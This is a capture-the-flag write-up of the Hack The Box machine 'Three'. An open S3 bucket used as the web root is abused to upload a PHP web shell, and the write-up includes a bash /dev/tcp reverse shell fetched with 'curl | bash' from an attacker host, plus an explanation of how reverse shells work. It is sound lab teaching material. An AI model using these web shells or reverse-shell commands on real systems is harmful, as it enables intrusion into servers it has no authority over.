# Three
#HTB #very-easy #AWS #Web #reverse-shell #cloud
## Target:
*Name:* Three
*IP:* 10.129.227.248
## Vulnerability: 
The target was vulnerable due to a misconfigured S3 bucket that allowed unauthenticated users to read and write objects. Since the bucket was used as the website's document root, uploading a PHP file resulted in remote code execution on the web server.
## Steps: 
#### 1) Reconnaissance
We used nmap to identify open ports and services running on the target machine.
**Code:**
```
nmap -sV 10.129.227.248
```
**Result:**
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-30 15:06 -0400
Nmap scan report for thetoppers.htb (10.129.227.248)
Host is up (0.063s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.20 seconds
```
The scan identified two open ports:
- **Port 80 (HTTP):** Running Apache HTTP Server 2.4.29. This is likely the main web application, so it will be the first service to investigate.
- **Port 22 (ssh):** Running OpenSSH 7.6p1. SSH provides secure remote command-line access to the system. If valid credentials are obtained during the assessment, this service may be used to gain remote access.
#### 2) Investigating the web application
While inspecting the website, we found the hostname **`thetoppers.htb`** in the contact email (`mail@thetoppers.htb`). This indicated that the application was configured to use the `thetoppers.htb` virtual host.
<img width="2559" height="1101" alt="image" src="https://github.com/user-attachments/assets/2c57b490-61b8-46df-9c91-9e78837222c2" />

We added the hostname to our local `/etc/hosts` file so that it resolved to the target IP address:
```
echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts
```
> [!NOTE]
>A **virtual host (vhost)** is a way for **one web server and one IP address to host multiple websites**.
>For example, suppose this server has the IP:
>```
>10.129.227.248
>```
>The same Apache server can host:
>```
>thetoppers.htb
>admin.thetoppers.htb
>blog.thetoppers.htb
>api.thetoppers.htb
>```
>Even though they all use the **same IP address**.
#### 3) Subdomains enumeration
Next, we performed **subdomain enumeration** on `thetoppers.htb` virtual host to find additional web applications or services running on the same server.
**Code:**
```
gobuster vhost -u http://thetoppers.htb --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```
**Result:**
```
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://thetoppers.htb
[+] Method:                    GET
[+] Threads:                   10
[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
s3.thetoppers.htb Status: 404 [Size: 21]
gc._msdcs.thetoppers.htb Status: 400 [Size: 306]
Progress: 4989 / 4989 (100.00%)
===============================================================
Finished
===============================================================
```
The scan revealed an additional virtual host:
```
s3.thetoppers.htb
```
This indicated the presence of an S3 service hosted as a subdomain. We then added the discovered subdomain to `/etc/hosts` because the domain was not publicly resolvable:
```
echo "10.129.227.248 s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

>[!NOTE] 
> S3 (Simple Storage Service) is a data storage service provided by Amazon Web Services (AWS). It allows users to store and retrieve files over the Internet in a reliable and secure way.

#### 4) Access to the s3 buckets using AWS command line
**Code:**
```
aws s3 ls --endpoint-url http://s3.thetoppers.htb
```
**Result:**
```
2026-07-30 15:01:11 thetoppers.htb
```
**Searching for the flag inside `thetoppers.htb` bucket:**
```         
┌──(___________)-[~]
└─$ aws s3 ls s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb
                           PRE images/
2026-07-30 15:01:11          0 .htaccess
2026-07-30 15:01:11      11952 index.php
┌──(____________)-[~]
└─$ aws s3 ls s3://thetoppers.htb/images/ --endpoint-url http://s3.thetoppers.htb
2026-07-30 15:01:11      90172 band.jpg
2026-07-30 15:01:11     282848 band2.jpg
2026-07-30 15:01:12    2208869 band3.jpg
2026-07-30 15:01:11      77206 final.jpg
2026-07-30 15:01:11      69170 mem1.jpg
2026-07-30 15:01:11      39270 mem2.jpg
2026-07-30 15:01:11      64347 mem3.jpg
```
The flag wasn't found in the s3 storage.
#### 5) Create a PHP web shell
After investigating the S3 bucket, we discovered that it contains the website files:
```
images/
.htaccess
index.php
```
Since `index.php` indicates that the website uses PHP and the S3 bucket appears to be the web root, we can attempt to upload a PHP file that will be executed by the web server.
Create the PHP shell:
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
This creates a file containing:
```
<?php system($_GET["cmd"]); ?>
```
The `system()` function executes operating system commands. The command is provided through the `cmd` parameter in the URL.
#### 6) Upload the PHP shell to the S3 bucket
**Code**:
```
aws s3 cp shell.php s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb
```
Because the bucket is used as the website root, the uploaded file should become accessible through the web server.
#### 7) Prepare a reverse shell
The PHP shell only allows executing commands through the browser. To obtain an interactive terminal, we create a reverse shell.
Create `shell.sh`:
```
nano shell.sh
```
Add:
```
#!/bin/bash
bash -i >& /dev/tcp/10.10.15.37/1337 0>&1
```
> [!NOTE]
> 10.10.15.37 is the attackers ip.
This script will make the target connect back to our machine on port `1337`.
#### 8) Start a listener on Kali
**Code:**
```
nc -nvlp 1337
```
Explanation:
- `nc` → netcat
- `-n` → don't resolve DNS
- `-v` → verbose output
- `-l` → listen mode
- `-p 1337` → listen on port 1337
Kali is now waiting for the target to connect.
#### 9) Host the reverse shell file
In the directory containing `shell.sh`:
```
python3 -m http.server 8000
```
This creates a temporary web server:
```
http://10.10.15.37:8000/shell.sh
```
The target will download the script from this URL.
#### 10) Execute the reverse shell through the PHP shell
Use the PHP shell to execute:
```
curl 10.10.15.37:8000/shell.sh | bash
```
The full URL becomes:
```
http://thetoppers.htb/shell.php?cmd=curl%2010.10.15.37:8000/shell.sh%20|%20bash
```
What happens:
1. The target runs `curl`
2. It downloads `shell.sh` from our machine
3. The `| bash` part executes the downloaded script
4. The script creates a connection back to our listener
#### 11) Execute commands on the target machine
After requesting the URL that executes `shell.sh`, netcat listener recieved:
```
bash: cannot set terminal process group (1670): Inappropriate ioctl for device
bash: no job control in this shell
www-data@three:/var/www/html$ 
```
We now have an interactive shell on the target machine.

**Seaching process:**
```
www-data@three:/var/www/html$ ls
ls
images
index.php
shell.php
www-data@three:/var/www/html$ cd ..
cd ..
www-data@three:/var/www$ ls
ls
flag.txt
html
www-data@three:/var/www$ cat flag.txt
cat flag.txt
<FLAG>
```

## Reverse Shell Concept
A shell is simply a program that:
```
INPUT  --->  bash  --->  OUTPUT
```
Normally:
```
Keyboard  --->  bash  --->  Terminal screen
```
The user types commands, bash executes them, and the output is displayed.
A **reverse shell** changes where the input and output come from.
Instead of:
```
Keyboard ---> bash ---> Screen
```
we make:
```
Network connection ---> bash ---> Network connection
```
The target machine connects back to the attacker and gives access to its shell.
#### Why `bash -i`?
```
bash -i
```
Starts an **interactive bash shell**.
- `bash` → starts the shell program
- `-i` → interactive mode (allows commands to be typed and executed)
In a reverse shell, this bash process will not use the target's keyboard and screen. Its input/output will be redirected to a network connection.
#### Netcat Listener
On the attacker machine:
```
nc -nvlp 1337
```
Netcat:
- opens port `1337`
- waits for a connection
- receives and sends data
It does **not** create the shell.
It is only a communication channel.
Just like a phone waiting for a call.
#### Reverse Shell Command
Example:
```
bash -i >& /dev/tcp/ATTACKER_IP/1337 0>&1
```
Breakdown:
**Start interactive shell:**
```
bash -i
```
Starts bash.
**Create TCP connection:**
```
/dev/tcp/ATTACKER_IP/1337
```
Bash connects to:
```
Target  ------------->  Attacker:1337
```
The target initiates the connection, which is why it is called a **reverse shell**.
**Redirect input/output:**
```
>&
0>&1
```
Redirects:
- commands coming from the network → bash input
- bash output → network
Result:
```
Attacker terminal
        |
        |
        v
     Netcat
        |
        |
        v
   TCP connection
        |
        |
        v
   Target bash
```
## Full Reverse Shell Flow
1. Attacker starts listener:
```
nc -nvlp 1337
```
2. Attacker uses an existing vulnerability (PHP web shell) to execute:
```
curl ATTACKER_IP:8000/shell.sh | bash
```
3. Target downloads and runs:
```
bash -i >& /dev/tcp/ATTACKER_IP/1337 0>&1
```
4. Target connects back:
```
Target  ----------------->  Kali:1337
```
5. Netcat receives the connection and provides access to the target's bash.
### Web shell:
```
Browser → PHP → command → output
```
One command at a time.
### Reverse shell:
```
Your terminal ↔ Target bash
```
Interactive terminal.
## Flag:
[Not disclosed — solve it yourself!]
## Key takeaway:
Misconfigured cloud storage permissions can lead to serious security issues. A publicly accessible and writable S3 bucket can expose sensitive files and, when combined with a web server that executes uploaded files, can result in remote code execution.
